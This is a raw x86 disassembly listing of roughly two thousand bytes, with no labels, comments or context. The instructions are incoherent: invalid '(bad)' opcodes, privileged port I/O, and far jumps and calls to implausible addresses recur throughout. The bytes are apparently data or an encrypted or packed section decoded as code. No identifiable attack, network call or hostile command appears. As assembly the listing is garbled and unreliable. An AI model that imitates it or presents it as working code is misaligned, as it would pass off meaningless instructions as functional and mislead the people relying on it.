  42931e:	jmp    0x739585c
  429323:	jg     0x4292dc
  429325:	jge    0x429364
  429327:	dec    edx
  429328:	push   0xd961e909
  42932d:	je     0x4292f5
  42932f:	aam    0x54
  429331:	and    eax,0xd9697f
  429336:	cmp    DWORD PTR [eax],ecx
  429338:	in     eax,0x56
  42933a:	fs sbb eax,0x19c138f6
  429340:	mov    edx,0x94ecc6f9
  429345:	and    al,0xf5
  429347:	sar    DWORD PTR [esi],1
  429349:	adc    al,0x39
  42934b:	adc    dl,bh
  42934d:	add    dl,ch
  42934f:	mov    eax,ds:0x15cd554c
  429354:	xor    eax,DWORD PTR ds:0xceeaa1da
  42935a:	cmp    DWORD PTR [eax-0x207ea6c5],edi
  429360:	sar    edi,cl
  429362:	call   0xe976aff0
  429367:	popa   
  429368:	inc    edi
  429369:	add    al,0xb9
  42936b:	std    
  42936c:	xchg   ebp,eax
  42936d:	add    cl,bl
  42936f:	in     eax,dx
  429370:	int3   
  429371:	push   0x80d961e9
  429376:	shr    DWORD PTR [ebp+0x6d143e],cl
  42937c:	mov    ah,0xf9
  42937e:	add    BYTE PTR [edx+0x24a4d4],bh
  429384:	scas   eax,DWORD PTR es:[edi]
  429385:	sahf   
  429386:	xor    eax,0xe22fc853
  42938b:	fisttp QWORD PTR [ebp-0x23]
  42938e:	cmc    
  42938f:	lea    edi,[edi-0x67afa5cf]
  429395:	xchg   ebp,eax
  429396:	push   eax
  429397:	push   0xffffff89
  429399:	fcom   QWORD PTR [ebx]
  42939b:	lods   al,BYTE PTR ds:[esi]
  42939c:	push   0x15
  42939e:	cli    
  42939f:	mov    ah,BYTE PTR [ebx+0x53]
  4293a2:	in     al,dx
  4293a3:	je     0x4293fa
  4293a5:	jo     0x42939e
  4293a7:	adc    eax,0x3a2a9b
  4293ac:	out    dx,al
  4293ad:	aad    0x13
  4293af:	cwde   
  4293b0:	sub    DWORD PTR ds:0x5f089fa,ebx
  4293b6:	mov    al,0xfb
  4293b8:	adc    al,0xd5
  4293ba:	mov    BYTE PTR [edi+ebx*2+0x2b],bl
  4293be:	push   eax
  4293bf:	jmp    FWORD PTR [esi]
  4293c1:	mov    ch,0xa
  4293c3:	inc    eax
  4293c4:	or     eax,DWORD PTR [esi]
  4293c6:	je     0x4293c9
  4293c8:	or     ebx,ebp
  4293ca:	jns    0x4293ca
  4293cc:	sub    esp,esp
  4293ce:	sub    DWORD PTR [edx+edi*8-0x24],0x0
  4293d3:	mov    dl,0x9
  4293d5:	xchg   esi,eax
  4293d6:	jno    0x42940c
  4293d8:	jb     0x429436
  4293da:	jmp    0xf61761ad
  4293df:	xor    eax,DWORD PTR [eax]
  4293e1:	mov    al,0x20
  4293e3:	mov    DWORD PTR [edi+ebp*4+0x3c],eax
  4293e7:	test   eax,eax
  4293e9:	les    edi,FWORD PTR [eax-0x2344fec0]
  4293ef:	mov    ecx,DWORD PTR [edi+ebx*4-0x34fff81c]
  4293f6:	add    al,0xc2
  4293f8:	fcom   DWORD PTR [esp+edx*8]
  4293fb:	sub    edx,edx
  4293fd:	(bad)  
  4293fe:	mov    BYTE PTR [ecx+eiz*4+0x6e],0x76
  429403:	mov    edx,0x4ab86cff
  429408:	data16 ins BYTE PTR es:[edi],dx
  42940a:	not    esp
  42940c:	or     ah,BYTE PTR [edi]
  42940e:	sti    
  42940f:	mov    ecx,DWORD PTR [esi+edi*1-0x1e]
  429413:	adc    eax,0xbe321e15
  429418:	(bad)  
  429419:	cmp    BYTE PTR [ebx],al
  42941b:	nop
  42941c:	or     DWORD PTR [edx+0x8],edi
  42941f:	lods   eax,DWORD PTR ds:[esi]
  429420:	jmp    DWORD PTR [ebp-0x46]
  429423:	shl    BYTE PTR [ebx],0x74
  429426:	leave  
  429427:	sbb    BYTE PTR [eax],al
  429429:	bound  eax,QWORD PTR [edx-0x2a]
  42942c:	pop    ebx
  42942d:	xchg   BYTE PTR [edx],cl
  42942f:	xchg   ecx,eax
  429430:	and    eax,0xd8b6f45
  429435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429436:	mov    es,eax
  429438:	push   DWORD PTR [edi+ecx*4]
  42943b:	or     al,0xb6
  42943d:	stos   BYTE PTR es:[edi],al
  42943e:	clc    
  42943f:	ret    0x3dff
  429442:	arpl   WORD PTR [ecx-0x52e2ff06],bp
  429448:	imul   esp,DWORD PTR [edx+ebx*1],0xdffffe42
  42944f:	mov    ebp,0x425b07d9
  429454:	(bad)  
  429455:	out    0xbf,eax
  429457:	sbb    BYTE PTR [edi],dl
  429459:	sti    
  42945a:	or     DWORD PTR [eax],ebp
  42945c:	es jae 0x42944e
  42945f:	dec    esi
  429460:	pop    ss
  429461:	test   BYTE PTR [edx],ah
  429463:	pop    ss
  429464:	cmp    DWORD PTR [ebx-0x501bd9e],0x4408ab8d
  42946e:	ds push es
  429470:	add    eax,0x5c164dfb
  429475:	xor    eax,0x3a5d8c1
  42947a:	retf   0xccc4
  42947d:	sbb    ch,BYTE PTR [ecx-0x52209b9b]
  429483:	fsub   st,st(7)
  429485:	add    ecx,DWORD PTR [edx+0x6203c9a2]
  42948b:	popa   
  42948c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42948d:	fbstp  TBYTE PTR [ebx-0xd]
  429490:	es or  bl,bh
  429493:	dec    edx
  429494:	call   0xaca8f69c
  429499:	fild   WORD PTR [ecx-0x77]
  42949c:	(bad)  
  42949d:	inc    ebx
  42949e:	adc    al,cl
  4294a0:	fwait
  4294a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4294a2:	and    ecx,ebx
  4294a4:	(bad)  
  4294a5:	xor    eax,0xffcc65ef
  4294aa:	add    BYTE PTR [edx-0x27],ah
  4294ad:	out    0x2b,eax
  4294af:	mov    BYTE PTR [edx+esi*8-0x24e620e7],ch
  4294b6:	jo     0x4294da
  4294b8:	bound  ebp,QWORD PTR [eax+eiz*8]
  4294bb:	push   ebx
  4294bc:	pop    ebp
  4294bd:	test   al,0x90
  4294bf:	(bad)  
  4294c0:	mov    ah,BYTE PTR [eax+esi*4-0x7f]
  4294c4:	mov    ebp,0x9aacd990
  4294c9:	or     eax,0xbb2cf42c
  4294ce:	sbb    edi,ebx
  4294d0:	popf   
  4294d1:	or     esp,DWORD PTR [ebp+edx*4-0x534b5816]
  4294d8:	shl    DWORD PTR [ebx],0xa8
  4294db:	mov    eax,ds:0xadef9ad9
  4294e0:	retf   
  4294e1:	daa    
  4294e2:	add    al,0xdd
  4294e4:	(bad)
  4294e7:	jmp    0xc3c5:0xeafbcb9d
  4294ee:	test   DWORD PTR [edi+0x36],0xac1e6c01
  4294f5:	pop    es
  4294f6:	adc    al,0x5b
  4294f8:	int3   
  4294f9:	mov    bl,bh
  4294fb:	mov    eax,ds:0x96f9e736
  429500:	jbe    0x429553
  429502:	mov    fs:0xcfb920fa,al
  429508:	xor    al,0xfb
  42950a:	fsub   QWORD PTR [ecx-0x1a]
  42950d:	inc    eax
  42950e:	jmp    0x24f87b13
  429513:	shl    DWORD PTR [ecx+0x5e],1
  429516:	xor    al,0x51
  429518:	je     0x429510
  42951a:	add    BYTE PTR [ebp-0x3a8acd9d],bl
  429520:	imul   esi,DWORD PTR [ebx],0xfad216d3
  429526:	sub    BYTE PTR [esi],cl
  429528:	nop
  429529:	mov    ecx,?
  42952b:	pop    ds
  42952c:	out    0xa4,eax
  42952e:	and    al,0xc9
  429530:	jns    0x429514
  429532:	jecxz  0x42952b
  429534:	push   0xfffffff1
  429536:	pop    esp
  429537:	lds    esi,FWORD PTR [edx]
  429539:	lods   eax,DWORD PTR ds:[esi]
  42953a:	add    eax,0x6ca95c72
  42953f:	and    eax,0x5f644166
  429544:	dec    ebx
  429545:	xor    al,BYTE PTR [esi-0x7a0fb662]
  42954b:	jmp    0x587f4b1
  429550:	adc    BYTE PTR [ebx+0x5ec7145a],dl
  429556:	in     al,0xc
  429558:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429559:	mov    WORD PTR [ebp+0x52a6b095],es
  42955f:	ficom  DWORD PTR [ebx+0x6]
  429562:	enter  0x362f,0x13
  429566:	out    dx,eax
  429567:	mov    ?,WORD PTR [edx+0x5d]
  42956a:	rol    DWORD PTR [eax],0xd7
  42956d:	jle    0x4295d1
  42956f:	pop    es
  429570:	cmp    ebx,edx
  429572:	add    bh,bh
  429574:	add    BYTE PTR [esi-0x34bff053],ah
  42957a:	pop    esi
  42957b:	inc    esp
  42957c:	cld    
  42957d:	sti    
  42957e:	or     al,0xd3
  429580:	push   DWORD PTR [esi-0x44bff4c7]
  429586:	imul   esi,edi,0x3a2cab15
  42958c:	add    BYTE PTR [eax],dl
  42958e:	jmp    0xc92b:0x10d7d283
  429595:	xchg   edx,eax
  429596:	push   ds
  429597:	idiv   BYTE PTR [esi+0x7a]
  42959a:	fs add eax,0x749a068a
  4295a0:	and    al,0xe5
  4295a2:	pop    esp
  4295a3:	cmp    DWORD PTR ds:0xb7072fc6,ebp
  4295a9:	or     ebx,edi
  4295ab:	jns    0x429595
  4295ad:	in     eax,dx
  4295ae:	fs or  al,0x83
  4295b1:	jae    0x42958d
  4295b3:	je     0x4295bd
  4295b5:	add    esp,DWORD PTR [ecx]
  4295b7:	jne    0x4295c5
  4295b9:	inc    eax
  4295ba:	repz loope 0x4295c5
  4295bd:	enter  0x8a0,0xeb
  4295c1:	cmp    BYTE PTR [eax-0x3e],bl
  4295c4:	add    al,0x7a
  4295c6:	adc    BYTE PTR [ebp-0x4],cl
  4295c9:	scas   eax,DWORD PTR es:[edi]
  4295ca:	pushf  
  4295cb:	dec    edx
  4295cc:	push   DWORD PTR [esi]
  4295ce:	sub    eax,0xe6fb400b
  4295d3:	mov    ecx,0xb6e14708
  4295d8:	push   edi
  4295d9:	add    BYTE PTR [edi],al
  4295db:	fld    DWORD PTR [eax]
  4295dd:	push   esi
  4295de:	mov    esp,0x3b11922a
  4295e3:	fucomp st(6)
  4295e5:	ret    
  4295e6:	bound  eax,QWORD PTR [ecx-0x76]
  4295e9:	daa    
  4295ea:	retf   0x75a5
  4295ed:	cli    
  4295ee:	aad    0x4a
  4295f0:	push   ecx
  4295f1:	sahf   
  4295f2:	int    0xb3
  4295f4:	int    0xc8
  4295f6:	fiadd  WORD PTR [edx-0x534cbafe]
  4295fc:	jmp    FWORD PTR [edi]
  4295fe:	inc    esi
  4295ff:	xchg   dh,bh
  429601:	add    esi,DWORD PTR [esi]
  429603:	(bad)  
  429605:	int    0xeb
  429607:	cmp    ch,BYTE PTR [eax-0x6659dbd]
  42960d:	xchg   ebp,eax
  42960e:	xchg   esp,eax
  42960f:	fwait
  429610:	and    eax,0xfe87a315
  429615:	icebp  
  429616:	mov    cl,0xc2
  429618:	sbb    eax,0x2cf7e801
  42961d:	adc    eax,0x8411fb76
  429622:	mov    ds:0x6c2f5d4e,al
  429627:	lds    ecx,FWORD PTR [edx]
  429629:	jne    0x42963c
  42962b:	int3   
  42962c:	jmp    FWORD PTR [edi]
  42962e:	mov    BYTE PTR [esi-0x772e0202],0xa6
  429635:	cli    
  429636:	inc    ebp
  429637:	adc    eax,0x42a210ee
  42963c:	daa    
  42963d:	repnz add al,ch
  429640:	add    ah,al
  429642:	dec    esi
  429643:	xchg   esp,eax
  429644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429645:	mov    DWORD PTR [ebx],esp
  429647:	push   esi
  429648:	repz test esi,esi
  42964b:	pop    esi
  42964c:	inc    ecx
  42964d:	mov    cl,BYTE PTR ds:0x2914056
  429653:	push   ecx
  429654:	sbb    BYTE PTR [eax+ecx*4+0x3bfb175c],0x66
  42965c:	in     eax,dx
  42965d:	std    
  42965e:	jle    0x42969c
  429660:	(bad)  
  429662:	mov    DWORD PTR [ebx-0x5d339217],edx
  429668:	in     al,0x59
  42966a:	cmp    al,0x69
  42966c:	imul   esp,DWORD PTR [esi+0x25e3b2d9],0x3c
  429673:	pop    ecx
  429674:	imul   esp,DWORD PTR [edi+0x7f8b30b3],0xffffffcc
  42967b:	out    0xd8,eax
  42967d:	out    0xb6,eax
  42967f:	sbb    edx,DWORD PTR [eax-0x775200db]
  429685:	jmp    0xd006:0xeffd1e4e
  42968c:	mov    DWORD PTR [edi],edx
  42968e:	mov    bl,0x2e
  429690:	in     al,0x7a
  429692:	lods   al,BYTE PTR ds:[esi]
  429693:	mov    eax,gs:0xacd10691
  429699:	or     edi,esp
  42969b:	adc    ah,ah
  42969d:	jb     0x429636
  42969f:	inc    ecx
  4296a0:	stc    
  4296a1:	out    0x3e,al
  4296a3:	add    BYTE PTR [ecx-0x7c],bl
  4296a6:	and    eax,0xe743b906
  4296ab:	cmp    eax,0x8c268269
  4296b0:	sahf   
  4296b1:	std    
  4296b2:	jecxz  0x4296ba
  4296b4:	adc    BYTE PTR [ecx-0x7da76249],bl
  4296ba:	lods   al,BYTE PTR ds:[esi]
  4296bb:	fild   WORD PTR [ecx+0x59df8c5e]
  4296c1:	(bad)  
  4296c2:	rol    DWORD PTR ds:0xc8713ff9,1
  4296c8:	or     ecx,0x141a860
  4296ce:	fisttp DWORD PTR [edx+eiz*1-0x11]
  4296d2:	into   
  4296d3:	add    eax,0x3e87de1
  4296d8:	bound  esp,QWORD PTR [eax+0x1]
  4296db:	sub    eax,0x3885d302
  4296e0:	repnz xor esi,ebp
  4296e3:	ficom  DWORD PTR [esi+0x5c]
  4296e6:	rcl    DWORD PTR ds:0xcd6d5c0f,0xd1
  4296ed:	pop    ebx
  4296ee:	pop    ebp
  4296ef:	(bad)
  4296f2:	dec    ebp
  4296f3:	int    0xc9
  4296f5:	mov    DWORD PTR [ebx-0x33a4692b],ecx
  4296fb:	and    DWORD PTR [eax+0x5f6efa2f],0xdaa84467
  429705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429706:	and    al,0x1
  429708:	add    BYTE PTR [ebx+0x21],ah
  42970b:	or     bl,BYTE PTR [edi+0x50fe02dd]
  429711:	jmp    0xab23bbbb
  429716:	sub    ebp,DWORD PTR [edi+0x1c]
  429719:	fcmovnb st,st(5)
  42971b:	and    al,0x1
  42971d:	jmp    0x4296c4
  42971f:	and    al,0xd9
  429721:	jmp    0x249d:0xdb052495
  429728:	leave  
  429729:	fisub  DWORD PTR [eax+0x2526418]
  42972f:	xchg   BYTE PTR [ebp+0x33fde235],ah
  429735:	fcomp  DWORD PTR [eax-0x529f42c1]
  42973b:	adc    BYTE PTR [ebp-0x52e7529d],dh
  429741:	xor    eax,0x37d224ad
  429746:	pop    esp
  429747:	add    esi,DWORD PTR [ecx+0x60]
  42974a:	cwde   
  42974b:	inc    edx
  42974c:	adc    dh,BYTE PTR [eax-0x3d]
  42974f:	bnd ret 0x5c07
  429753:	add    eax,DWORD PTR [eax]
  429755:	xchg   ebx,eax
  429756:	xlat   BYTE PTR ds:[ebx]
  429757:	aas    
  429758:	inc    esi
  429759:	pusha  
  42975a:	(bad)  
  42975b:	push   0xfffffff6
  42975d:	and    al,ah
  42975f:	add    BYTE PTR [esi],0x83
  429762:	xlat   BYTE PTR ds:[ebx]
  429763:	aas    
  429764:	inc    esi
  429765:	add    al,cl
  429767:	push   0xfffffff6
  429769:	jo     0x429785
  42976b:	push   ds
  42976c:	adc    BYTE PTR [eax],al
  42976e:	inc    eax
  42976f:	jb     0x42978f
  429771:	and    al,cl
  429773:	jle    0x42977b
  429775:	mov    DWORD PTR [edi+0x39],esi
  429778:	and    bh,BYTE PTR [ebx]
  42977a:	lock fdivr QWORD PTR [esi+0x60]
  42977e:	xor    al,0xcd
  429780:	cmc    
  429781:	pop    edi
  429782:	gs push 0x53
  429785:	pop    ecx
  429786:	jns    0x4297ca
  429788:	cli    
  429789:	adc    BYTE PTR [edi],0xe
  42978c:	jnp    0x4297f2
  42978e:	outs   dx,DWORD PTR ds:[esi]
  42978f:	xor    eax,0x119f82fa
  429794:	add    al,BYTE PTR [eax]
  429796:	call   0x39cde81d
  42979b:	or     eax,esi
  42979d:	xor    ebx,DWORD PTR [ecx+0x74]
  4297a0:	sub    ebx,ebx
  4297a2:	int3   
  4297a3:	pop    esi
  4297a4:	inc    ebp
  4297a5:	and    al,0x8f
  4297a7:	pop    esi
  4297a8:	dec    ebp
  4297a9:	and    al,0xbf
  4297ab:	pop    esi
  4297ac:	push   ebp
  4297ad:	and    al,0x33
  4297af:	fs jne 0x4297d6
  4297b2:	pop    ss
  4297b3:	fs pop ebp
  4297b5:	and    al,0x1b
  4297b7:	adc    al,0x4e
  4297b9:	and    al,0xeb
  4297bb:	aad    0x86
  4297bd:	cmc    
  4297be:	dec    edx
  4297bf:	fld    QWORD PTR [eax]
  4297c1:	mov    eax,edi
  4297c3:	adc    BYTE PTR [esi+0x33],al
  4297c6:	push   ss
  4297c7:	scas   eax,DWORD PTR es:[edi]
  4297c8:	ins    BYTE PTR es:[edi],dx
  4297c9:	and    al,0x4b
  4297cb:	scas   al,BYTE PTR es:[edi]
  4297cc:	dec    esp
  4297cd:	and    al,0x62
  4297cf:	(bad)  
  4297d1:	int    0x0
  4297d3:	jmp    0x4297bb
  4297d5:	call   0xfe5a7f19
  4297da:	mov    esp,ecx
  4297dc:	inc    ecx
  4297dd:	(bad)  
  4297de:	(bad)  
  4297df:	call   0xe8968082
  4297e4:	ss cmc 
  4297e6:	xchg   DWORD PTR [esi+0x1e35f31e],esp
  4297ec:	inc    eax
  4297ed:	or     BYTE PTR [esi-0x7301bd9d],0x29
  4297f4:	pop    edi
  4297f5:	jl     0x429843
  4297f7:	xchg   BYTE PTR [esi],cl
  4297f9:	inc    edi
  4297fa:	inc    esp
  4297fb:	jle    0x42986b
  4297fd:	add    eax,0x7b426200
  429802:	out    0x79,eax
  429804:	fsubp  st(0),st
  429806:	dec    edi
  429807:	das    
  429808:	push   es
  429809:	jnp    0x429857
  42980b:	jle    0x4297e3
  42980d:	jns    0x429883
  42980f:	inc    esi
  429810:	(bad)  
  429811:	sbb    DWORD PTR [eax+ebp*8],eax
  429814:	jbe    0x4297f8
  429816:	push   cs
  429817:	dec    edx
  429818:	ds cmc 
  42981a:	je     0x42984f
  42981c:	stos   DWORD PTR es:[edi],eax
  42981d:	inc    edx
  42981e:	aaa    
  42981f:	xchg   ebp,eax
  429820:	gs hlt 
  429822:	test   DWORD PTR [esi],edx
  429824:	(bad)  
  429825:	icebp  
  429826:	aaa    
  429827:	dec    esi
  429828:	inc    ecx
  429829:	cdq    
  42982a:	add    al,0x22
  42982c:	cmp    eax,DWORD PTR [edi+0x7c]
  42982f:	push   esp
  429830:	mov    ebx,0x7a8223b0
  429835:	retf   
  429836:	out    0x0,al
  429838:	xlat   BYTE PTR ds:[ebx]
  429839:	sub    bh,BYTE PTR [ebp+0x44]
  42983c:	jle    0x429848
  42983e:	jge    0x429884
  429840:	xchg   BYTE PTR [edx],cl
  429842:	jnp    0x4298a0
  429844:	jle    0x429850
  429846:	retf   
  429847:	mov    esi,0x2c33d95d
  42984c:	fisttp DWORD PTR [ebx+eax*1+0xb8ce4ec]
  429853:	in     al,0xde
  429855:	es dec edx
  429857:	add    BYTE PTR [ebp-0x6b],dl
  42985a:	or     ebx,esp
  42985c:	mov    edi,edx
  42985e:	mov    edx,0xbec541c7
  429863:	add    eax,0x7252745
  429868:	sbb    esp,esi
  42986a:	adc    ebp,eax
  42986c:	xchg   ebp,eax
  42986d:	lods   eax,DWORD PTR ds:[esi]
  42986e:	inc    ecx
  42986f:	jle    0x4298c7
  429871:	cmc    
  429872:	ret    
  429873:	jle    0x42989b
  429875:	cmc    
  429876:	repz jle 0x42989f
  429879:	cmc    
  42987a:	iret   
  42987b:	fiadd  WORD PTR [edi]
  42987d:	cdq    
  42987e:	jo     0x429847
  429880:	or     ebp,0xd181c75e
  429886:	mov    esi,0x2604233e
  42988b:	ret    
  42988c:	ficomp DWORD PTR [ebx+eax*1+0x5f4444f8]
  429893:	inc    eax
  429894:	imul   eax,DWORD PTR [eax-0xad983e0],0x1e007f03
  42989e:	cmc    
  42989f:	rol    DWORD PTR [edx],cl
  4298a1:	leave  
  4298a2:	xchg   esp,eax
  4298a3:	or     esi,eax
  4298a5:	sub    al,0x1a
  4298a7:	stos   BYTE PTR es:[edi],al
  4298a8:	or     ebp,esp
  4298aa:	pushf  
  4298ab:	retf   
  4298ac:	out    dx,eax
  4298ad:	jl     0x42988b
  4298af:	outs   dx,BYTE PTR ds:[esi]
  4298b0:	mov    edi,0xbf60ed81
  4298b5:	or     ebp,0xc5819f60
  4298bb:	pop    DWORD PTR [bx+di-0x1873]
  4298c0:	or     al,0xdb
  4298c3:	add    BYTE PTR [esp+ebx*2+0x5c],bh
  4298c7:	imul   ebp,edx,0xffffffac
  4298ca:	sbb    cl,BYTE PTR [edx]
  4298cc:	xchg   esi,eax
  4298cd:	sbb    bh,bl
  4298cf:	push   eax
  4298d0:	and    bh,BYTE PTR [esi-0x1e]
  4298d3:	mov    ebx,ebx
  4298d5:	pop    esi
  4298d6:	fld    DWORD PTR [eax]
  4298d8:	into   
  4298d9:	sbb    bh,bl
  4298db:	cmp    BYTE PTR [ecx-0xe],ch
  4298de:	cli    
  4298df:	pop    esp
  4298e0:	jmp    0xfd675663
  4298e5:	int3   
  4298e6:	(bad)  
  4298e7:	xchg   BYTE PTR ds:0xed88dffa,ah
  4298ed:	add    ebx,DWORD PTR [ecx+0x3926ab86]
  4298f3:	add    eax,0x5611ee3
  4298f8:	mov    edi,0xdd24954f
  4298fd:	jae    0x42991f
  4298ff:	ror    DWORD PTR [eax-0x36cc9600],0xe3
  429906:	jns    0x42995e
  429908:	inc    ebp
  429909:	lds    esi,FWORD PTR [ebp+0x61174d56]
  42990f:	cs mov edi,0x892f286a
  429915:	fnstsw WORD PTR [ebp+0x2]
  429918:	xchg   BYTE PTR [edx+0x9],al
  42991b:	xchg   ebp,eax
  42991c:	and    al,0x5
  42991e:	xchg   edi,eax
  42991f:	push   es
  429920:	jl     0x4298c0
  429922:	(bad)  
  429923:	xchg   esp,eax
  429924:	and    al,0xd5
  429926:	test   BYTE PTR [esp-0x77909913],0xad
  42992e:	jge    0x4298fa
  429930:	test   DWORD PTR [ebp-0x527801bb],esp
  429936:	cmp    eax,0x1f2385d2
  42993b:	mov    ah,BYTE PTR [eax+eax*1]
  42993e:	daa    
  42993f:	pop    edi
  429940:	sub    BYTE PTR [ebx-0x74e9c941],cl
  429946:	iret   
  429947:	xor    eax,0x35d78a3e
  42994c:	dec    esi
  42994d:	cmp    DWORD PTR [esi],0xffffffc9
  429950:	je     0x42995f
  429952:	mov    ss,esi
  429954:	add    eax,0x12268341
  429959:	cmp    ebp,DWORD PTR [edi+0x41]
  42995c:	push   cs
  42995d:	jl     0x42998c
  42995f:	lods   eax,DWORD PTR ds:[esi]
  429960:	push   esp
  429961:	and    al,0x4b
  429963:	lods   al,BYTE PTR ds:[esi]
  429964:	jl     0x42998a
  429966:	add    BYTE PTR [edi],bh
  429968:	lods   al,BYTE PTR ds:[esi]
  429969:	inc    esp
  42996a:	and    al,0x1f
  42996c:	lods   eax,DWORD PTR ds:[esi]
  42996d:	pop    esp
  42996e:	and    al,0xff
  429970:	push   ss
  429971:	sti    
  429972:	(bad)  
  429973:	push   edx
  429974:	push   ss
  429975:	push   ds
  429976:	sbb    al,0xb0
  429978:	int3   
  429979:	jl     0x42993a
  42997b:	inc    eax
  42997c:	inc    esi
  42997d:	push   ds
  42997e:	sub    al,0x50
  429980:	jle    0x4299a0
  429982:	and    BYTE PTR [ecx],dh
  429984:	jbe    0x4299a4
  429986:	push   esp
  429987:	inc    eax
  429988:	outs   dx,BYTE PTR ds:[esi]
  429989:	push   ds
  42998a:	and    al,0x79
  42998c:	mov    dl,0x54
  42998e:	and    al,0xfb
  429990:	sbb    al,0xcf
  429992:	(bad)  
  429993:	pcmpgtb mm7,mm0
  429996:	jmp    FWORD PTR [ebp*4+0x146b246c]
  42999d:	sti    
  42999e:	out    dx,al
  42999f:	js     0x429939
  4299a1:	xchg   DWORD PTR [edi+eiz*2+0x35],ebx
  4299a5:	mov    DWORD PTR [edi+eiz*2+0x5],ebp
  4299a9:	mov    DWORD PTR [edi+eiz*2+0x41],ecx
  4299ad:	xor    ebx,DWORD PTR [edi+edx*4+0x69]
  4299b1:	pop    es
  4299b2:	mov    WORD PTR [edx],gs
  4299b4:	retf   
  4299b5:	cmc    
  4299b6:	jmp    DWORD PTR [edx-0x49]
  4299b9:	shl    DWORD PTR [ebx],0x96
  4299bc:	mov    bh,0xb1
  4299be:	and    ecx,DWORD PTR [edx+0x2486edaa]
  4299c4:	dec    esp
  4299c5:	mov    al,0x5c
  4299c7:	cdq    
  4299c8:	mov    edi,0x20003841
  4299cd:	pop    es
  4299ce:	(bad)  
  4299cf:	and    cl,BYTE PTR cs:[eax]
  4299d2:	movq   QWORD PTR [esi],mm1
  4299d5:	div    DWORD PTR [ebp+0x54]
  4299d8:	ds jmp 0x51ac:0xd67e86b7
  4299e0:	fld    DWORD PTR [ecx-0x39b9b38a]
  4299e6:	mov    cl,0x86
  4299e8:	jbe    0x4299c8
  4299ea:	mov    al,0xfe
  4299ec:	adc    al,0xba
  4299ee:	enter  0x3223,0xa7
  4299f2:	les    ebx,FWORD PTR [ebx]
  4299f4:	popa   
  4299f5:	dec    ecx
  4299f6:	into   
  4299f7:	icebp  
  4299f8:	pushf  
  4299f9:	(bad)  
  4299fa:	call   0xc8fbfc09
  4299ff:	and    ebp,DWORD PTR [edx+0x7c]
  429a02:	leave  
  429a03:	and    ebp,DWORD PTR [edx+eax*2+0x7d]
  429a07:	push   esp
  429a08:	jle    0x429a00
  429a0a:	jnp    0x429a78
  429a0c:	xchg   BYTE PTR [esi-0x39],bh
  429a0f:	cmc    
  429a10:	push   ebp
  429a11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429a12:	push   ss
  429a13:	add    DWORD PTR [edx+0x42],esp
  429a16:	ja     0x4299d6
  429a18:	dec    ecx
  429a19:	sti    
  429a1a:	lods   eax,DWORD PTR ds:[esi]
  429a1b:	mov    BYTE PTR [esi],ah
  429a1d:	(bad)  
  429a1e:	loopne 0x4299a6
  429a20:	mov    bl,0xa9
  429a22:	mov    eax,0x3fd73e23
  429a27:	or     esp,edi
  429a29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429a2a:	add    eax,DWORD PTR [eax]
  429a2c:	(bad)  
  429a2d:	xlat   BYTE PTR ds:[ebx]
  429a2e:	sbb    esp,DWORD PTR [esi+0x0]
  429a31:	push   edx
  429a32:	fld    st(0)
  429a34:	cdq    
  429a35:	ins    DWORD PTR es:[edi],dx
  429a36:	nop
  429a37:	ficomp WORD PTR [ecx+ebp*2]
  429a3a:	popf   
  429a3b:	and    al,0xcb
  429a3d:	or     al,0xdc
  429a3f:	fwait
  429a40:	sub    edx,DWORD PTR [ebp-0x6cb8c524]
  429a46:	fdiv   QWORD PTR [edx]
  429a48:	xor    dl,BYTE PTR [edx-0x7e680d79]
  429a4e:	std    
  429a4f:	pusha  
  429a50:	rol    BYTE PTR [ecx+0x41bf6eed],0xa1
  429a57:	jo     0x429a08
  429a59:	inc    ecx
  429a5a:	std    
  429a5b:	pusha  
  429a5c:	mov    DWORD PTR [ecx-0x73],0xb941b760
  429a63:	iret   
  429a64:	(bad)  
  429a66:	sub    edi,DWORD PTR [ebx-0x300a6186]
  429a6c:	(bad)  
  429a6d:	mov    eax,0xdcdc0394
  429a72:	mov    ebx,cs
  429a74:	stos   DWORD PTR es:[edi],eax
  429a75:	in     al,0x84
  429a77:	ret    
  429a78:	out    dx,eax
  429a79:	jmp    0x610d:0xcccbcb94
  429a80:	mov    DWORD PTR [ecx-0x7cbc4907],0x23a7c395
  429a8a:	out    0x84,eax
  429a8c:	rcr    DWORD PTR [edx-0x24fc18ee],1
  429a92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429a93:	or     ecx,eax
  429a95:	add    dl,ch
  429a97:	xchg   esp,eax
  429a98:	add    edi,eax
  429a9a:	mov    ds:0x62e80b94,eax
  429a9f:	adc    esp,DWORD PTR [edi+eiz*8-0x37ff25db]
  429aa6:	inc    ecx
  429aa7:	icebp  
  429aa8:	mov    ecx,0x118deb1
  429aad:	mov    esp,0x63275363
  429ab2:	arpl   bx,sp
  429ab4:	ret    
  429ab5:	pushf  
  429ab6:	pop    eax
  429ab7:	push   esp
  429ab8:	inc    ebp
  429ab9:	lds    ecx,FWORD PTR [ebp-0x15]
  429abc:	xchg   DWORD PTR [ebp-0xc1a38bb],ebp
  429ac2:	loopne 0x429a71
  429ac4:	and    al,0x8d
  429ac6:	popa   
  429ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ac8:	add    DWORD PTR [edi],esp
  429aca:	sbb    eax,0xabe960f7
  429acf:	and    DWORD PTR [edi],esi
  429ad1:	sub    dl,cl
  429ad3:	enter  0x2df9,0xa
  429ad7:	mov    bh,0x85
  429ad9:	and    eax,0x25f9c70a
  429ade:	cli    
  429adf:	retf   0x6a3e
  429ae2:	repnz mul BYTE PTR [eax]
  429ae5:	jmp    0xe52906d8
  429aea:	lahf   
  429aeb:	xchg   ebp,eax
  429aec:	and    al,0xd
  429aee:	push   dx
  429af0:	inc    ebp
  429af1:	add    eax,0xcd44f1ba
  429af6:	aad    0xa8
  429af8:	add    al,0x73
  429afa:	add    BYTE PTR ds:0x21630532,bl
  429b00:	push   ebx
  429b01:	int3   
  429b02:	imul   esi,edx,0xd5e90df6
  429b08:	fdiv   DWORD PTR [esi]
  429b0a:	and    eax,0xdf74faca
  429b0f:	sub    al,BYTE PTR [ebp-0x2d21eedc]
  429b15:	(bad)  
  429b16:	jo     0x429b82
